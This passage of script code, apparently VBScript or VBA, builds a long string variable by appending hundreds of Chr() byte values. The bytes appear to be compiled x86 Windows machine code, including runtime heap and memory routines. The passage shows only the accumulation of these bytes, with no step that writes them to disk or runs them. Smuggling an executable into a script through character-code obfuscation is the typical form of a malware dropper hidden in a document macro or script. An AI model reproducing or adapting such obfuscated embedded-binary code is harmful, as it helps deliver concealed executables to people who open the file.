ySXd=ySXd&Chr(137)&Chr(68)&Chr(50)&Chr(248)&Chr(233)&Chr(60)&Chr(1)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(233)&Chr(56)&Chr(1)&Chr(0)&Chr(0)&Chr(15)&Chr(141)&Chr(47)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(93)&Chr(12)&Chr(41)&Chr(117)&Chr(16)&Chr(141)&Chr(78)&Chr(1)&Chr(137)&Chr(75)&Chr(252)&Chr(141)&Chr(92)&Chr(51)&Chr(252)&Chr(139)&Chr(117)&Chr(16)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(137)&Chr(93)&Chr(12)&Chr(137)&Chr(75)&Chr(252)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(246)&Chr(69)&Chr(252)&Chr(1)&Chr(15)&Chr(133)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(252)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(139)&Chr(79)&Chr(4)&Chr(59)&Chr(79)&Chr(8)&Chr(117)&Chr(66)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(254)&Chr(32)
ySXd=ySXd&Chr(115)&Chr(25)&Chr(139)&Chr(206)&Chr(211)&Chr(235)&Chr(141)&Chr(116)&Chr(6)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(144)&Chr(68)&Chr(254)&Chr(14)&Chr(117)&Chr(35)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(28)&Chr(141)&Chr(78)&Chr(224)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(6)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(79)&Chr(8)&Chr(139)&Chr(119)&Chr(4)&Chr(137)&Chr(113)&Chr(4)&Chr(139)&Chr(119)&Chr(8)&Chr(139)&Chr(79)&Chr(4)&Chr(137)&Chr(113)&Chr(8)&Chr(139)&Chr(117)&Chr(16)&Chr(3)&Chr(117)&Chr(252)&Chr(137)&Chr(117)&Chr(16)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(139)&Chr(77)&Chr(244)
ySXd=ySXd&Chr(141)&Chr(12)&Chr(241)&Chr(139)&Chr(121)&Chr(4)&Chr(137)&Chr(75)&Chr(8)&Chr(137)&Chr(123)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)&Chr(75)&Chr(4)&Chr(137)&Chr(89)&Chr(8)&Chr(139)&Chr(75)&Chr(4)&Chr(59)&Chr(75)&Chr(8)&Chr(117)&Chr(87)&Chr(138)&Chr(76)&Chr(6)&Chr(4)&Chr(136)&Chr(77)&Chr(15)&Chr(254)&Chr(193)&Chr(136)&Chr(76)&Chr(6)&Chr(4)&Chr(131)&Chr(254)&Chr(32)&Chr(115)&Chr(28)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(206)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(57)&Chr(141)&Chr(68)&Chr(144)&Chr(68)&Chr(139)&Chr(206)&Chr(235)&Chr(32)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(78)&Chr(224)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(121)&Chr(4)&Chr(141)&Chr(132)&Chr(144)
ySXd=ySXd&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(78)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(16)&Chr(139)&Chr(69)&Chr(16)&Chr(137)&Chr(3)&Chr(137)&Chr(68)&Chr(24)&Chr(252)&Chr(51)&Chr(192)&Chr(64)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(161)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(77)&Chr(8)&Chr(107)&Chr(192)&Chr(20)&Chr(3)&Chr(5)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(193)&Chr(23)&Chr(131)&Chr(225)&Chr(240)&Chr(137)&Chr(77)&Chr(240)&Chr(193)&Chr(249)&Chr(4)&Chr(83)&Chr(73)&Chr(131)&Chr(249)&Chr(32)&Chr(86)&Chr(87)&Chr(125)&Chr(11)&Chr(131)&Chr(206)&Chr(255)&Chr(211)&Chr(238)&Chr(131)&Chr(77)&Chr(248)&Chr(255)&Chr(235)&Chr(13)&Chr(131)&Chr(193)&Chr(224)&Chr(131)&Chr(202)&Chr(255)&Chr(51)&Chr(246)&Chr(211)&Chr(234)
ySXd=ySXd&Chr(137)&Chr(85)&Chr(248)&Chr(139)&Chr(13)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(217)&Chr(235)&Chr(17)&Chr(139)&Chr(83)&Chr(245)&Chr(139)&Chr(59)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(216)&Chr(114)&Chr(232)&Chr(59)&Chr(216)&Chr(117)&Chr(127)&Chr(139)&Chr(29)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(235)&Chr(17)&Chr(139)&Chr(83)&Chr(4)&Chr(139)&Chr(59)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(217)&Chr(114)&Chr(232)&Chr(59)&Chr(217)&Chr(117)&Chr(91)&Chr(235)&Chr(12)&Chr(131)&Chr(123)&Chr(8)&Chr(0)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(216)&Chr(114)&Chr(240)&Chr(59)&Chr(216)&Chr(117)&Chr(49)&Chr(139)
ySXd=ySXd&Chr(29)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(235)&Chr(9)&Chr(131)&Chr(123)&Chr(8)&Chr(0)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(217)&Chr(114)&Chr(240)&Chr(59)&Chr(217)&Chr(117)&Chr(21)&Chr(232)&Chr(160)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(216)&Chr(137)&Chr(93)&Chr(8)&Chr(133)&Chr(219)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(9)&Chr(2)&Chr(0)&Chr(0)&Chr(83)&Chr(232)&Chr(58)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(75)&Chr(16)&Chr(137)&Chr(1)&Chr(139)&Chr(67)&Chr(16)&Chr(131)&Chr(56)&Chr(255)&Chr(116)&Chr(229)&Chr(137)&Chr(29)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(16)&Chr(139)&Chr(16)&Chr(137)&Chr(85)&Chr(252)&Chr(131)&Chr(250)&Chr(255)&Chr(116)&Chr(20)&Chr(139)&Chr(140)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(124)&Chr(144)&Chr(68)&Chr(35)&Chr(77)
ySXd=ySXd&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(207)&Chr(117)&Chr(41)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(72)&Chr(68)&Chr(139)&Chr(57)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(14)&Chr(255)&Chr(69)&Chr(252)&Chr(139)&Chr(145)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(193)&Chr(4)&Chr(235)&Chr(231)&Chr(139)&Chr(85)&Chr(252)&Chr(139)&Chr(202)&Chr(105)&Chr(201)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(244)&Chr(139)&Chr(76)&Chr(144)&Chr(68)&Chr(51)&Chr(255)&Chr(35)&Chr(206)&Chr(117)&Chr(18)&Chr(139)&Chr(140)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(35)&Chr(77)&Chr(248)&Chr(106)&Chr(32)&Chr(95)&Chr(235)&Chr(3)&Chr(3)&Chr(201)&Chr(71)&Chr(133)&Chr(201)&Chr(125)&Chr(249)&Chr(139)&Chr(77)
ySXd=ySXd&Chr(244)&Chr(139)&Chr(84)&Chr(249)&Chr(4)&Chr(139)&Chr(10)&Chr(43)&Chr(77)&Chr(240)&Chr(139)&Chr(241)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(137)&Chr(77)&Chr(248)&Chr(126)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(59)&Chr(247)&Chr(15)&Chr(132)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(74)&Chr(4)&Chr(59)&Chr(74)&Chr(8)&Chr(117)&Chr(92)&Chr(131)&Chr(255)&Chr(32)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(125)&Chr(38)&Chr(139)&Chr(207)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(124)&Chr(56)&Chr(4)&Chr(247)&Chr(211)&Chr(137)&Chr(93)&Chr(236)&Chr(35)&Chr(92)&Chr(136)&Chr(68)&Chr(137)&Chr(92)&Chr(136)&Chr(68)&Chr(254)&Chr(15)&Chr(117)&Chr(51)&Chr(139)&Chr(77)&Chr(236)&Chr(139)&Chr(93)&Chr(8)&Chr(33)&Chr(11)&Chr(235)&Chr(44)&Chr(141)&Chr(79)&Chr(224)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(252)&Chr(141)
ySXd=ySXd&Chr(140)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(124)&Chr(56)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(25)&Chr(254)&Chr(15)&Chr(137)&Chr(93)&Chr(236)&Chr(117)&Chr(11)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(77)&Chr(236)&Chr(33)&Chr(75)&Chr(4)&Chr(235)&Chr(3)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(125)&Chr(248)&Chr(0)&Chr(139)&Chr(74)&Chr(8)&Chr(139)&Chr(122)&Chr(4)&Chr(137)&Chr(121)&Chr(4)&Chr(139)&Chr(74)&Chr(4)&Chr(139)&Chr(122)&Chr(8)&Chr(137)&Chr(121)&Chr(8)&Chr(15)&Chr(132)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(244)&Chr(141)&Chr(12)&Chr(241)&Chr(139)&Chr(121)&Chr(4)&Chr(137)&Chr(74)&Chr(8)&Chr(137)&Chr(122)&Chr(35)&Chr(137)&Chr(81)&Chr(4)&Chr(139)&Chr(74)&Chr(4)&Chr(137)&Chr(81)&Chr(8)&Chr(139)&Chr(74)&Chr(4)&Chr(59)&Chr(74)&Chr(8)&Chr(117)&Chr(94)&Chr(138)&Chr(76)&Chr(6)&Chr(4)&Chr(136)
ySXd=ySXd&Chr(77)&Chr(11)&Chr(254)&Chr(193)&Chr(131)&Chr(254)&Chr(32)&Chr(136)&Chr(76)&Chr(6)&Chr(4)&Chr(125)&Chr(35)&Chr(128)&Chr(125)&Chr(11)&Chr(0)&Chr(117)&Chr(11)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(206)&Chr(211)&Chr(239)&Chr(9)&Chr(59)&Chr(139)&Chr(206)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(252)&Chr(9)&Chr(124)&Chr(136)&Chr(68)&Chr(235)&Chr(41)&Chr(128)&Chr(125)&Chr(11)&Chr(0)&Chr(117)&Chr(13)&Chr(141)&Chr(78)&Chr(224)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(9)&Chr(123)&Chr(4)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(188)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(78)&Chr(224)&Chr(190)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(115)&Chr(9)&Chr(55)&Chr(139)&Chr(77)&Chr(248)&Chr(133)&Chr(201)&Chr(116)&Chr(11)&Chr(137)&Chr(10)&Chr(137)&Chr(76)
ySXd=ySXd&Chr(17)&Chr(252)&Chr(235)&Chr(3)&Chr(139)&Chr(77)&Chr(248)&Chr(139)&Chr(117)&Chr(240)&Chr(3)&Chr(209)&Chr(141)&Chr(78)&Chr(1)&Chr(137)&Chr(10)&Chr(137)&Chr(76)&Chr(50)&Chr(252)&Chr(139)&Chr(117)&Chr(244)&Chr(139)&Chr(14)&Chr(141)&Chr(121)&Chr(1)&Chr(137)&Chr(62)&Chr(133)&Chr(201)&Chr(117)&Chr(26)&Chr(59)&Chr(29)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(18)&Chr(139)&Chr(77)&Chr(252)&Chr(59)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(117)&Chr(7)&Chr(131)&Chr(37)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(137)&Chr(8)&Chr(141)&Chr(66)&Chr(4)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(59)&Chr(13)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(117)&Chr(2)&Chr(243)&Chr(195)&Chr(233)&Chr(24)&Chr(23)&Chr(0)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(83)&Chr(86)&Chr(87)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(139)
ySXd=ySXd&Chr(68)&Chr(36)&Chr(20)&Chr(139)&Chr(76)&Chr(36)&Chr(24)&Chr(85)&Chr(82)&Chr(80)&Chr(81)&Chr(81)&Chr(104)&Chr(128)&Chr(80)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(196)&Chr(137)&Chr(68)&Chr(36)&Chr(8)&Chr(100)&Chr(137)&Chr(37)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(48)&Chr(139)&Chr(88)&Chr(8)&Chr(139)&Chr(76)&Chr(36)&Chr(44)&Chr(51)&Chr(25)&Chr(139)&Chr(112)&Chr(12)&Chr(131)&Chr(254)&Chr(254)&Chr(116)&Chr(59)&Chr(139)&Chr(84)&Chr(36)&Chr(52)&Chr(131)&Chr(250)&Chr(254)&Chr(116)&Chr(4)&Chr(59)&Chr(242)&Chr(118)&Chr(46)&Chr(141)&Chr(52)&Chr(118)&Chr(141)&Chr(92)&Chr(179)&Chr(16)&Chr(139)&Chr(11)&Chr(137)&Chr(72)&Chr(12)&Chr(131)&Chr(123)&Chr(4)&Chr(0)&Chr(117)&Chr(204)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)
ySXd=ySXd&Chr(67)&Chr(8)&Chr(232)&Chr(190)&Chr(24)&Chr(0)&Chr(0)&Chr(185)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(67)&Chr(8)&Chr(232)&Chr(208)&Chr(24)&Chr(0)&Chr(0)&Chr(235)&Chr(176)&Chr(100)&Chr(143)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(95)&Chr(94)&Chr(91)&Chr(195)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(247)&Chr(65)&Chr(4)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(51)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(72)&Chr(8)&Chr(51)&Chr(200)&Chr(232)&Chr(62)&Chr(255)&Chr(255)&Chr(255)&Chr(85)&Chr(139)&Chr(104)&Chr(24)&Chr(255)&Chr(112)&Chr(12)&Chr(255)&Chr(112)&Chr(16)&Chr(255)&Chr(112)&Chr(20)&Chr(232)&Chr(62)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(137)&Chr(2)
ySXd=ySXd&Chr(184)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(85)&Chr(139)&Chr(76)&Chr(36)&Chr(8)&Chr(139)&Chr(41)&Chr(255)&Chr(113)&Chr(28)&Chr(255)&Chr(113)&Chr(24)&Chr(255)&Chr(113)&Chr(40)&Chr(232)&Chr(21)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(85)&Chr(86)&Chr(87)&Chr(83)&Chr(139)&Chr(234)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(51)&Chr(210)&Chr(51)&Chr(246)&Chr(51)&Chr(255)&Chr(255)&Chr(209)&Chr(91)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(234)&Chr(139)&Chr(241)&Chr(139)&Chr(193)&Chr(106)&Chr(1)&Chr(232)&Chr(27)&Chr(24)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(51)&Chr(201)&Chr(51)&Chr(210)&Chr(51)&Chr(255)&Chr(255)&Chr(230)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(87)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(104)&Chr(39)&Chr(81)&Chr(64)&Chr(0)&Chr(81)&Chr(232)&Chr(247)
ySXd=ySXd&Chr(32)&Chr(0)&Chr(0)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(108)&Chr(36)&Chr(8)&Chr(82)&Chr(81)&Chr(255)&Chr(116)&Chr(36)&Chr(20)&Chr(232)&Chr(180)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(194)&Chr(8)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(246)&Chr(5)&Chr(0)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(86)&Chr(116)&Chr(8)&Chr(106)&Chr(10)&Chr(232)&Chr(211)&Chr(195)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(131)&Chr(221)&Chr(255)&Chr(255)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(106)&Chr(22)&Chr(232)&Chr(56)&Chr(221)&Chr(255)&Chr(255)&Chr(89)&Chr(246)&Chr(5)&Chr(0)&Chr(170)&Chr(64)&Chr(0)&Chr(2)&Chr(15)&Chr(132)&Chr(202)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(137)&Chr(133)&Chr(224)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(220)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(149)&Chr(216)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(157)&Chr(212)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(181)&Chr(208)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(189)&Chr(204)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(149)&Chr(248)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(141)&Chr(236)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(157)&Chr(200)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(133)&Chr(196)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(165)&Chr(192)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(173)&Chr(188)&Chr(253)&Chr(255)&Chr(255)&Chr(156)&Chr(143)&Chr(133)&Chr(240)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(117)&Chr(4)&Chr(141)&Chr(69)&Chr(4)&Chr(137)&Chr(133)&Chr(244)&Chr(253)&Chr(255)&Chr(255)&Chr(199)&Chr(133)&Chr(48)
ySXd=ySXd&Chr(253)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(137)&Chr(181)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(64)&Chr(252)&Chr(106)&Chr(80)&Chr(137)&Chr(133)&Chr(228)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(80)&Chr(232)&Chr(94)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(199)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(21)&Chr(0)&Chr(0)&Chr(64)&Chr(137)&Chr(181)&Chr(228)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(44)&Chr(253)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(21)&Chr(152)&Chr(128)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(97)&Chr(194)&Chr(255)&Chr(255)&Chr(204)&Chr(131)&Chr(37)&Chr(172)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(84)&Chr(36)&Chr(12)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(133)&Chr(210)&Chr(116)&Chr(105)&Chr(51)&Chr(192)&Chr(138)&Chr(68)&Chr(36)&Chr(8)&Chr(132)&Chr(192)&Chr(117)&Chr(22)&Chr(129)&Chr(250)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(14)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(5)&Chr(233)&Chr(254)&Chr(22)&Chr(0)&Chr(0)&Chr(87)&Chr(139)&Chr(249)&Chr(131)&Chr(250)&Chr(4)&Chr(114)&Chr(49)&Chr(247)&Chr(217)&Chr(131)&Chr(225)&Chr(3)&Chr(116)&Chr(12)&Chr(43)&Chr(209)&Chr(136)&Chr(7)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(233)
ySXd=ySXd&Chr(1)&Chr(117)&Chr(246)&Chr(139)&Chr(200)&Chr(193)&Chr(224)&Chr(8)&Chr(3)&Chr(193)&Chr(139)&Chr(200)&Chr(193)&Chr(224)&Chr(16)&Chr(3)&Chr(193)&Chr(139)&Chr(202)&Chr(131)&Chr(226)&Chr(3)&Chr(193)&Chr(233)&Chr(2)&Chr(116)&Chr(6)&Chr(243)&Chr(171)&Chr(133)&Chr(210)&Chr(116)&Chr(10)&Chr(136)&Chr(7)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(234)&Chr(1)&Chr(117)&Chr(246)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(95)&Chr(195)&Chr(139)&Chr(68)&Chr(36)&Chr(4)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(200)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(194)&Chr(210)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(139)&Chr(93)&Chr(8)&Chr(51)&Chr(255)&Chr(59)&Chr(223)&Chr(15)&Chr(149)&Chr(192)&Chr(59)&Chr(199)&Chr(117)&Chr(29)&Chr(232)&Chr(207)&Chr(216)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(232)&Chr(87)
ySXd=ySXd&Chr(216)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(83)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(56)&Chr(106)&Chr(4)&Chr(232)&Chr(213)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(83)&Chr(232)&Chr(221)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(116)&Chr(11)&Chr(139)&Chr(115)&Chr(252)&Chr(131)&Chr(238)&Chr(9)&Chr(137)&Chr(117)&Chr(228)&Chr(235)&Chr(3)&Chr(139)&Chr(117)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(37)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(125)&Chr(224)&Chr(117)&Chr(16)&Chr(83)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(200)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(139)&Chr(198)&Chr(232)&Chr(130)&Chr(210)&Chr(255)&Chr(255)&Chr(195)
ySXd=ySXd&Chr(51)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(117)&Chr(228)&Chr(106)&Chr(4)&Chr(232)&Chr(163)&Chr(213)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(106)&Chr(2)&Chr(232)&Chr(160)&Chr(190)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(18)&Chr(131)&Chr(232)&Chr(8)&Chr(129)&Chr(56)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(112)&Chr(233)&Chr(255)&Chr(255)&Chr(89)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(86)&Chr(51)&Chr(219)&Chr(87)&Chr(139)&Chr(241)&Chr(57)&Chr(29)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(56)&Chr(83)&Chr(83)&Chr(51)&Chr(255)&Chr(71)&Chr(87)&Chr(104)&Chr(224)&Chr(136)
